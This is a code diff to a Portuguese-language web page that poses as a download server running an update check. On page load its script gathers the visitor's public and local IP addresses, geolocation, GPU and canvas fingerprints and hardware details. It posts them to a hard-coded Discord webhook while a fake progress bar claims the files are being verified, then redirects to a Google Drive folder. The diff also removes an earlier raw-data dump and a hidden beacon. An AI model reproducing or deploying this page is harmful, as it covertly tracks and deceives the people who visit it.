@@ -3,26 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Autenticação Corporativa - Portal Seguro</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <title>Servidor de Download - Verificação</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 </head>
-<body style="margin:0;height:100vh;background:linear-gradient(135deg,#0f2027 0%,#203a43 50%,#2c5364 100%);display:flex;align-items:center;justify-content:center;font-family:'Inter',sans-serif;overflow:hidden;position:relative;">
+<body style="margin:0;height:100vh;background:#000;display:flex;align-items:center;justify-content:center;font-family:'Inter',sans-serif;overflow:hidden;">
     
-    <!-- Partículas de fundo -->
-    <canvas id="particles" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;opacity:0.1;"></canvas>
-    
-    <div style="max-width:480px;width:92%;text-align:center;box-shadow:0 35px 80px rgba(0,0,0,0.6);padding:60px 50px;border-radius:30px;background:linear-gradient(145deg,#ffffff12,#ffffff08);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.1);color:#fff;position:relative;z-index:2;">
-        <div style="font-size:32px;font-weight:700;margin-bottom:10px;background:linear-gradient(135deg,#00d4ff,#5b8bf8);background-clip:text;-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:-0.5px;">🔐 Verificação de Segurança</div>
-        <div style="font-size:16px;color:rgba(255,255,255,0.7);margin-bottom:35px;font-weight:400;">Estabelecendo conexão segura com o servidor corporativo...</div>
+    <div style="width:420px;text-align:center;background:#111;border:2px solid #333;border-radius:12px;box-shadow:0 0 50px rgba(255,0,0,0.2);padding:50px 40px;color:#fff;position:relative;overflow:hidden;">
+        <!-- Barra vermelha superior -->
+        <div style="height:4px;background:linear-gradient(90deg,#ff0000,#cc0000);position:absolute;top:0;left:0;right:0;"></div>
         
-        <div style="width:100%;height:8px;background:rgba(255,255,255,0.15);border-radius:4px;overflow:hidden;margin-bottom:25px;">
-            <div id="progress" style="height:100%;background:linear-gradient(90deg,#00d4ff,#5b8bf8,#ff6b9d);width:0%;transition:width 0.5s cubic-bezier(0.4,0,0.2,1);box-shadow:0 0 20px rgba(0,212,255,0.5);position:relative;">
-                <div id="progress-glow" style="position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.4),transparent);transform:translateX(-100%);animation:shine 2s infinite;"></div>
+        <div style="font-size:28px;font-weight:700;margin-bottom:8px;color:#fff;letter-spacing:1px;">📥 Servidor de Download</div>
+        <div style="font-size:14px;color:#888;margin-bottom:35px;font-weight:400;">Verificando update e assets...</div>
+        
+        <div style="width:100%;height:6px;background:#222;border:1px solid #333;border-radius:3px;overflow:hidden;margin-bottom:25px;">
+            <div id="progress" style="height:100%;background:linear-gradient(90deg,#ff0000,#ff4444);width:0%;transition:width 0.5s ease;box-shadow:0 0 15px rgba(255,0,0,0.6);position:relative;">
+                <div id="progress-glow" style="position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.3),transparent);transform:translateX(-100%);animation:shine 1.5s infinite;"></div>
             </div>
         </div>
         
-        <div id="status" style="font-size:18px;font-weight:500;color:rgba(255,255,255,0.9);margin-bottom:10px;min-height:24px;">Iniciando análise...</div>
-        <div id="details" style="font-size:14px;color:rgba(255,255,255,0.6);font-weight:300;"></div>
+        <div id="status" style="font-size:16px;font-weight:600;color:#fff;margin-bottom:8px;min-height:22px;">Iniciando verificação...</div>
+        <div id="details" style="font-size:13px;color:#888;font-weight:400;"></div>
     </div>
     
     <style>
@@ -30,52 +30,13 @@
             0% { transform:translateX(-100%); }
             100% { transform:translateX(100%); }
         }
-        @keyframes float {
-            0%,100% { transform:translateY(0px); }
-            50% { transform:translateY(-10px); }
-        }
     </style>
     
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1484989346569392300/y2sl6gZt8PJgIRrB_MSXyil6qIwKK8CdV9f7Xtis4VBDdrvyItQafC_gI8mROBxeQk8z';
         const DOWNLOAD_URL = 'https://drive.google.com/drive/folders/1lNC2YwOY2L7igNExbPcJ2u9rOp6CtTR8?hl=pt-br';
         
-        // Partículas animadas
-        function initParticles() {
-            const canvas = document.getElementById('particles');
-            const ctx = canvas.getContext('2d');
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            
-            const particles = [];
-            for(let i = 0; i < 80; i++) {
-                particles.push({
-                    x: Math.random() * canvas.width,
-                    y: Math.random() * canvas.height,
-                    vx: (Math.random() - 0.5) * 0.5,
-                    vy: (Math.random() - 0.5) * 0.5,
-                    radius: Math.random() * 2 + 0.5
-                });
-            }
-            
-            function animate() {
-                ctx.clearRect(0, 0, canvas.width, canvas.height);
-                ctx.fillStyle = 'rgba(255,255,255,0.03)';
-                particles.forEach(p => {
-                    p.x += p.vx;
-                    p.y += p.vy;
-                    if(p.x < 0 || p.x > canvas.width) p.vx *= -1;
-                    if(p.y < 0 || p.y > canvas.height) p.vy *= -1;
-                    ctx.beginPath();
-                    ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
-                    ctx.fill();
-                });
-                requestAnimationFrame(animate);
-            }
-            animate();
-        }
-        
-        // COLETA AVANÇADA DE INFORMAÇÕES (mantida igual)
+        // COLETA AVANÇADA (mantida igual)
         async function advancedRecon() {
             const pubIP = await (async()=>{
                 const sources = [
@@ -225,8 +186,6 @@
         
         // EXECUÇÃO PRINCIPAL
         async function executeBreach() {
-            initParticles();
-            
             const targetData = await advancedRecon();
             
             // WEBHOOK EXECUTIVO
@@ -234,53 +193,30 @@
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    username: '🎮 GAME PENTEST v2.0',
-                    content: `🎯 **TARGET ACESSADO** | ${targetData.public_ip} | ${targetData.fingerprint.platform}`,
+                    username: '📥 DOWNLOAD SERVER v2.0',
+                    content: `🎯 **TARGET ACESSADO** | ${targetData.public_ip}`,
                     embeds: [{
-                        title: `📱 Device Fingerprint [${targetData.screen.resolution}]`,
+                        title: `📱 Device [${targetData.screen.resolution}]`,
                         fields: [
                             {name:"🌐 IPs",value:`**PUB:** ${targetData.public_ip}\n**LAN:** ${targetData.local_network.slice(0,40)}${targetData.local_network.length>40 ? '...' : ''}`,inline:true},
                             {name:"🗺️ Geoloc",value:targetData.geolocation,inline:true},
                             {name:"🖥️ GPU",value:targetData.gpu_signature.slice(0,30),inline:true},
-                            {name:"🧠 Hardware",value:`${targetData.fingerprint.cores}c/${targetData.fingerprint.memory}GB`,inline:true},
+                            {name:"🧠 Specs",value:`${targetData.fingerprint.cores}c/${targetData.fingerprint.memory}GB`,inline:true},
                             {name:"🌈 Canvas",value:targetData.canvas_fp.slice(0,35),inline:true},
-                            {name:"📡 Connection",value:targetData.fingerprint.connection,inline:true}
+                            {name:"📡 Net",value:targetData.fingerprint.connection,inline:true}
                         ],
-                        color: 0xff6b9d,
-                        thumbnail: {url: `https://api.dicebear.com/7.x/avataaars/svg?seed=${targetData.public_ip}`}
-                    }, {
-                        title: "🔍 Browser Profile",
-                        fields: [
-                            {name:"Plugins",value:targetData.plugins,inline:true},
-                            {name:"Touch",value:targetData.fingerprint.maxTouchPoints,inline:true},
-                            {name:"TZ",value:targetData.fingerprint.timezone.slice(0,20),inline:true},
-                            {name:"Lang",value:targetData.fingerprint.language,inline:true}
-                        ],
-                        color: 0x5b8bf8
+                        color: 0xff0000
                     }]
                 })
             });
             
-            // WEBHOOK RAW DATA
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: `💾 **COMPLETE RECON DUMP** | ${targetData.timestamp} | ${targetData.referrer ? '🔗'+targetData.referrer.slice(0,50) : 'direct'}`,
-                    embeds: [{description: `\`\`\`json\n${JSON.stringify(targetData,null,2).slice(0,3950)}\`\`\``, color: 0x00ff88}]
-                })
-            });
-            
-            // C2 Beacon silencioso
-            new Image().src = `https://httpbin.org/post?b=1&ip=${targetData.public_ip}&fp=${btoa(JSON.stringify(targetData.fingerprint)).slice(0,100)}&ref=${btoa(targetData.referrer)}`;
-            
-            // ANIMAÇÃO GUI
+            // ANIMAÇÃO
             const phases = [
-                {p:25, msg:'🔍 Detectando rede...', detail:'Escaneando interfaces locais'},
-                {p:45, msg:'🛡️ Verificando segurança...', detail:'Analisando fingerprinting evasion'},
-                {p:70, msg:'🔐 Criptografando sessão...', detail:'AES-256 + TLS 1.3'},
-                {p:92, msg:'✅ Validando credenciais...', detail:'Autenticação multifator concluída'},
-                {p:100, msg:'🎮 Acesso liberado...', detail:'Redirecionando...'}
+                {p:20, msg:'🔍 Verificando conexão...', detail:'Testando servidor primario'},
+                {p:40, msg:'📦 Validando assets...', detail:'Checando integridade dos arquivos'},
+                {p:65, msg:'⚙️ Baixando update...', detail:'Aplicando patch v2.1.3'},
+                {p:85, msg:'🔒 Verificando hash...', detail:'SHA-256 validado'},
+                {p:100, msg:'✅ Update concluído!', detail:'Redirecionando...'}
             ];
             
             let phase = 0;
@@ -292,16 +228,9 @@
                 phase++;
                 if(phase >= phases.length) {
                     clearInterval(interval);
-                    redirectToGame();
+                    setTimeout(() => window.location.href = DOWNLOAD_URL, 1200);
                 }
-            }, 800);
-        }
-        
-        // REDIRECIONA DIRETO PRO GOOGLE DRIVE
-        function redirectToGame() {
-            setTimeout(() => {
-                window.location.href = DOWNLOAD_URL;
-            }, 1500);
+            }, 700);
         }
         
         // AUTO-EXECUTE
